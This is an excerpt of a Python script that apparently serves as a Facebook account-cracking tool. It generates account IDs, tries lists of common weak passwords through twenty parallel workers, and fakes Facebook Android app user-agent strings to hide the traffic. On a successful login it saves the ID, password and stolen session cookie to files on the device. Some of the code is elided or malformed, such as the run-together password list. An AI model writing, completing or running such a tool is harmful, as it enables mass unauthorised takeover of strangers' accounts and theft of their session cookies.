...
\033[1;37m [•] \033[1;37mOwner     :   Raham abbas
 ...
 [•] Version   :  \033[1;32m 1.7\033[1;32m \033[1;37m
\033[1;37m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
...
def pak():
                ...
                with tred(max_workers=20) as ISHMUM:     
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'khankhan"last7','last6"last5"07860786"234567"first6"first8"first4"janjan"baloch"pubg123"pubg1234"first4"first5"last4 last5"last2"first2"first3"last3"khan123"khan1234"khan786"786786"khan1122']
                                if mthd in ['1','01']:                                 
                                    ISHMUM.submit(rndm1,ids,passlist)
                                if mthd in ['2','02']:    
                                    ISHMUM.submit(rndm,ids,passlist)                                	
...
def M1(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/399.0.0.24.93;FBBV/420811604;FBDM/{density=3.9,width=1080,height=1920};FBLC/lt_LT;FBCR/Red Pocket Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A307FN;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]"
                                ...
                                if 'session_key' in q:
                                        ...
                                        print("\033[1;33m [R.R-🍪] :\033[1;33m "+cookie)                                                   
                                        open('/sdcard/R.S_m1_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/R.S_iDs_COOKiE_M1.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')                      
                                        oks.append(ids)                           
                                        break                          
...
def M4(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                fban = random.choice(["FB4A", "FB5A", "FB6A"])
                                fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])
                                ua = f"[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/Orca-Android;FBAV/14.0.0.20.69;FBBV/12945441;FBDM/{density=3.4,width=480,height=800};FBLC/dz_BT;FBCR/GLOMOBILE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.orca;FBDV/G3502I;FBSV/4.3;nullFBCA/armeabi-v7a:armeabi;]"
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
